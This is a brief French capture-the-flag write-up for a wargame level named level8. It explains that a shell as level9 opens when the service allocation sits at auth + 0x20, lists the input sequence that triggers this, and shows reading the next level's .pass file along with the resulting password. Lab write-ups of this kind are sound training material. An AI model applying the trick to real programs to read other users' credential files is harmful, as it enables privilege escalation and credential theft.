# Analyse du code

Apres analyse de code nous voyons que pour ouvrir le shell en tant que level9
il faut que auth + 0x20 = service
Ensuite nous mettons login

auth avec espace
service avec espace

# Exploit
	```bash
	$ ./level8
	auth
	service
	service
	login
	$	cat /home/user/level9/.pass
	```
	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

	